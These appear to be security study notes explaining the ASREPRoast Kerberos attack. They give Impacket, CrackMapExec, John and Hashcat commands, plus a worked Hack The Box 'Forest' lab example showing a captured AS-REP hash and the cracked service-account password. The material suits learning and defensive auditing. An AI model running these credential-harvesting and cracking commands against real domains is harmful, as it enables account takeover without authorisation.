
## Definition

ASREPRoast is a security attack that exploits users who lack the **Kerberos pre-authentication required attribute**. Essentially, this vulnerability allows attackers to request authentication for a user from the Domain Controller (DC) without needing the user's password. The DC then responds with a message encrypted with the user's password-derived key, which attackers can attempt to crack offline to discover the user's password.


More indepth:

The Kerberos authentication protocol works with tickets in order to grant access. A ST (Service Ticket) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can be obtained by validating a first step named "pre-authentication" (except if that requirement is explicitly removed for some accounts, making them vulnerable to **ASREProast**).

The pre-authentication requires the requesting user to supply its secret key (DES, RC4, AES128 or AES256) derived from the user password. Technically, when asking the KDC (Key Distribution Center) for a TGT (Ticket Granting Ticket), the requesting user needs to validate pre-authentication by sending a timestamp encrypted with it's own credentials. It ensures the user is requesting a TGT for himself. Once validated, the TGT is then sent to the user in the `KRB_AS_REP` message, but that message also contains a session key. That session key is encrypted with the requested user's NT hash.

Because some applications don't support Kerberos preauthentication, it is common to find users with Kerberos preauthentication disabled, hence allowing attackers to request TGTs for these users and crack the session keys offline. This is ASREProasting.

While this technique can possibly allow to retrieve a user's credentials, the TGT obtained in the `KRB_AS_REP` messages are encrypted cannot be used without knowledge of the account's password.


The [Impacket](https://github.com/SecureAuthCorp/impacket) script [GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) (Python) can get TGTs for the users that have the property `Do not require Kerberos preauthentication` set.


```
# users list dynamically queried with an LDAP anonymous bind
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'

# with a users file
GetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'

# users list dynamically queried with a LDAP authenticated bind (password)
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'

# users list dynamically queried with a LDAP authenticated bind (NT hash)
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
```


# examples:

## Forest

### Quick vuln check

```
kali@kali ~> impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161
Impacket v0.11.0 - Copyright 2023 Fortra

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2023-10-26 18:32:23.241448  2019-09-23 07:09:47.931194  0x410200 
```


### enacting the attack

```
kali@kali ~> impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161 -request
Impacket v0.11.0 - Copyright 2023 Fortra

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2023-10-26 18:33:54.048111  2019-09-23 07:09:47.931194  0x410200 


$krb5asrep$23$svc-alfresco@HTB.LOCAL:e3ec409e2c2d795d6ad9bfbf778d0b54$277c17b80be36ea44ed004891408c77aee65c865da10b0a6fee89dabeb58b1d7791908f9af37d88c29f55b3d48e3cff0a5cda05839158ba15a2af8840c0b1ea51bd806279b6199dea926bed98482416eed4cc80e9c7bdbd2f9850d3c6d7bcfb3063bb2d3a1482b3aaf905e561205f36792ae4e27fa8e9b53253960eeb7cb7ed3dfde7154c0b66fc0d90377440b3b67615d2b78fdc579bcd6838e8c4f16353dab4ee23c551b693c7214c36c8da13d423475fba80e4f3e5eb97659c638b807d2fdef7b7c6edffa6c11cd3c4078ca99a86fbf93c6d599306685ec9e3399034f750d12c2cc686137
```

### NetExec / CrackMapExec can also be used

```
crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --KdcHost $KeyDistributionCenter
```

### hash cracking

#### John

```
kali@kali ~> john ASREProastables.txt --fork=4 -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Node numbers 1-4 of 4 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
```


#### Hashcat

```
hashcat -m 18200 -a 0 ASREProastables.txt $wordlist
```